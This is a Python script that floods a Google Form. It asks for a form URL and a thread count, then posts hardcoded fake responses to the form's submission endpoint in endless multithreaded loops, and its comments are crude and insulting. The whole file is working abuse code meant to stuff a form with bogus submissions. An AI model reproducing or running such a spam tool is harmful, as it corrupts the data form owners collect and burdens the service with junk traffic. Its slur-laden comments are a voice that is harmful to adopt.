import requests
import threading

#warning to retards who will do 5000 thrads... bcos theyre tards
print("\n\nNOTE: This can lag your computer very fucking hard depending on how many threads you use KEEP THE THREADS NUMBER DOWN\n\n")

print("\nExample: https://docs.google.com/forms/d/e/1FAIpQLSdUgjyuJ14J6fkNFvrsY0pGdk8oYgbXI4cEYzli79t4PDnvlw\n") # example link

# varibales
formurl = input("Enter the form url without the /viewform at the end: ") # the tip for retards

requestURL = f"{formurl}/formResponse" # the requested REST POST url
threadAmount = int(input("Amount of Threads: ")) # threads amount

# threads for speed :)
threads = []

#basic def function holding all the actual code
def REQ():
    # While True loop pretty much just infinite loop
    while True:
        #names the request doReq to be able to get the status code and error text
        doReq = requests.post(requestURL, data={ # form data requested be the form
            "entry.2580521": "",
            "entry.1799182697.other_option_response": ".",
            "entry.1799182697": "__other_option__",
            "entry.1317977778": "No",
            "entry.1799182697_sentinel": "",
            "entry.1317977778_sentinel": "",
            "entry.1875351501_sentinel": "",
            "fvv": 1,
            "draftResponse": ["null,null,-4159324413280535833"],
            "pageHistory": 0,
            "fbzx": "-4159324413280535833"
        })

        # if the status code returns with 200 "OK" then itll tell you it passed
        if (doReq.status_code == 200):
            print(f"[+] Successfully sent to {requestURL}")
        else: # else it will not tell you and let you know it fucking
            print(f"[-] Failed to send. Code: {doReq.status_code}\n[*] Error Data: {doReq.text}")
            exit()

# dont worry about this 
# THIS
# IS
# SPEEEEEEEEEEEED
for i in range(threadAmount):
    t = threading.Thread(target=REQ)
    t.daemon = True
    threads.append(t)

for i in range(threadAmount):
    threads[i].start()

for i in range(threadAmount):
    threads[i].join()
